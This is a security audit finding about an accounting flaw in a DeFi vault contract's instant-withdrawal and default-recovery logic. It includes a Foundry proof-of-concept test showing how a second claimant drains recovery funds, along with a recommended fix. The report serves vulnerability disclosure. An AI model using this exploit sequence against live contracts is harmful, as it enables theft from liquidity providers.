### Title

Claimed instant withdrawals corrupt default-recovery accounting and let later claimants drain recovery funds - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`claimInstantWithdrawRequest()` clears only the user's aggregate receipt balance. It does not clear `instantWithdrawsRequestsByEpoch` or `instantWithdrawClaimsByEpoch`, so an already-paid instant withdrawal remains in the current epoch's default-recovery basis. If another instant withdrawal remains unfunded when the borrower defaults, finalization treats the previously claimed amount as both outstanding claim basis and prefunded reserve. This inflates `defaultRecoveryPrice` without adding corresponding underlying tokens, allowing a later receipt holder to extract recovery assets belonging to active LPs and leaving subsequent claims permanently unpayable.

### Finding Description

`requestInstantWithdraw()` records the same receipt amount in `instantWithdrawsRequests`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`, and `pendingInstantWithdraws`. [1](#0-0) 

After the CDO funds the request, `claimInstantWithdrawRequest()` burns the user's aggregate receipt amount and sends the underlying, but only resets `instantWithdrawsRequests`; both per-epoch ledgers retain the claimed amount. [2](#0-1) 

If another instant request is then left pending and a borrower default occurs, `defaultPendingClaimBasis()` adds the stale `instantWithdrawClaimsByEpoch[epochNumber]` value to the default basis. [3](#0-2) 

`_defaultPrefundedInstantReserve()` also calculates the already-funded portion as `instantWithdrawClaimsByEpoch - pendingInstantWithdraws`. A receipt that was already claimed is therefore incorrectly counted as reserve backing even though its underlying was already paid out. [4](#0-3) 

`finalizeDefaultRecovery()` uses the inflated reserve and inflated claim basis to derive `defaultRecoveryPrice`. [5](#0-4) 

The second instant claimant clears only their own per-epoch amount, pays against the inflated recovery price, and decreases `defaultRecoveryReserve`; the strategy can therefore pay more aggregate recovery than its actual token balance supports. [6](#0-5) [7](#0-6) 

### Impact Explanation

A KYC-passing tranche holder can convert previously claimed instant receipts into phantom default-recovery basis and reserve.

Using active basis `P`, stale claimed amount `A`, unfunded instant claim `B`, and actual recovered cash `R`:

- Correct recovery price: `R / (P + B)`
- Actual recovery price: `(R + A) / (P + A + B)`

For `P = 100`, `A = 100`, `B = 100`, and `R = 50`, the correct price is `0.25`, while the corrupted price is `0.5`. The second claimant receives `50` instead of `25`, draining the entire actual recovery reserve. Active or post-default claimants are then left with accounting claims against a strategy holding no corresponding underlying.

This is direct theft from the recovery estate followed by permanent freezing of remaining recovery claims.

### Likelihood Explanation

The attack requires only ordinary instant-withdraw usage during a running epoch:

1. An APR drop enables instant withdrawals.
2. The attacker or another unprivileged user requests and successfully claims an instant withdrawal.
3. A second instant withdrawal is created in the same epoch.
4. Funding that second request fails and triggers an honest borrower default.
5. Recovery finalization consumes the stale epoch accounting.

No malicious privileged role is required. The epoch checks, skim logic, `_onlyIdleCDO()` guard, funded-claim reserve guard, and default-finalization guard do not remove the stale per-epoch receipt entries.

### Recommendation

When `claimInstantWithdrawRequest()` pays a user, clear that user's per-epoch receipt and decrement `instantWithdrawClaimsByEpoch` by the same amount. If receipts from multiple epochs can coexist, clear each funded epoch explicitly rather than relying on a single aggregate balance.

```solidity
uint256 currentEpoch = epochNumber;
uint256 amount = instantWithdrawsRequests[_user];

instantWithdrawsRequests[_user] = 0;
instantWithdrawsRequestsByEpoch[_user][currentEpoch] = 0;
instantWithdrawClaimsByEpoch[currentEpoch] -= amount;
_burn(_user, amount);
_transferFundedClaim(_user, amount);
```

The implementation should use the actual epochs associated with the claim rather than assuming every funded instant receipt belongs to `epochNumber`, and should add a regression test covering “claim instant receipt → request another instant receipt in the same epoch → default → finalize recovery.”

### Proof of Concept

```solidity
function testClaimedInstantReceiptInflatesDefaultRecovery() public {
    // Pool setup:
    // - attacker1 and attacker2 are KYC-passing AA holders.
    // - Instant withdrawals are enabled.
    // - The prior epoch APR exceeds current APR + instantWithdrawAprDelta.
    _startEpoch();

    uint256 activeBasis = 100 ether;
    uint256 staleClaim = 100 ether;
    uint256 pendingClaim = 100 ether;
    uint256 recovered = 50 ether;

    // attacker1 requests an instant withdrawal during epoch N.
    vm.prank(attacker1);
    cdo.requestWithdraw(staleClaimTrancheTokens, AATranche);

    // Honest manager funds it after the instant-withdraw delay.
    vm.warp(cdo.instantWithdrawDeadline() + 1);
    _fundBorrower(staleClaim);
    vm.prank(manager);
    cdo.getInstantWithdrawFunds();

    // attacker1 is paid, but epoch accounting retains the claimed amount.
    vm.prank(attacker1);
    cdo.claimInstantWithdrawRequest();

    assertEq(strategy.instantWithdrawsRequests(attacker1), 0);
    assertEq(
        strategy.instantWithdrawsRequestsByEpoch(attacker1, strategy.epochNumber()),
        staleClaim
    );
    assertEq(
        strategy.instantWithdrawClaimsByEpoch(strategy.epochNumber()),
        staleClaim
    );

    // attacker2 creates a new instant request in the same epoch.
    vm.prank(attacker2);
    cdo.requestWithdraw(pendingClaimTrancheTokens, AATranche);

    assertEq(strategy.pendingInstantWithdraws(), pendingClaim);
    assertEq(
        strategy.instantWithdrawClaimsByEpoch(strategy.epochNumber()),
        staleClaim + pendingClaim
    );

    // Honest borrower cannot fund the second request; the manager's normal
    // funding call enters the borrower-default path.
    _setBorrowerUnderlyingBalance(0);
    vm.prank(manager);
    cdo.getInstantWithdrawFunds();

    assertTrue(cdo.defaulted());
    assertEq(strategy.pendingInstantWithdraws(), pendingClaim);

    // Default accounting treats the already-paid 100 as both basis and reserve.
    assertEq(
        strategy.defaultPendingClaimBasis(),
        staleClaim + pendingClaim
    );

    _fundRecoverySource(recovered);
    vm.prank(manager);
    underlying.approve(address(strategy), recovered);
    vm.prank(manager);
    cdo.finalizeDefault(recovered, manager);

    // Correct price: 50 / (100 active + 100 pending) = 0.25.
    // Corrupted price: (50 + phantom 100) / (100 + 100 + 100) = 0.5.
    assertEq(strategy.defaultRecoveryPrice(), 0.5 ether);

    // attacker2 receives the full 50 actual recovery instead of the fair 25.
    vm.prank(attacker2);
    cdo.claimInstantWithdrawRequest();

    assertEq(underlying.balanceOf(attacker2), recovered);
    assertEq(underlying.balanceOf(address(strategy)), 0);

    // The contract still records recovery liabilities it can no longer pay.
    assertGt(strategy.defaultRecoveryReserve(), 0);
}
```

```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
```
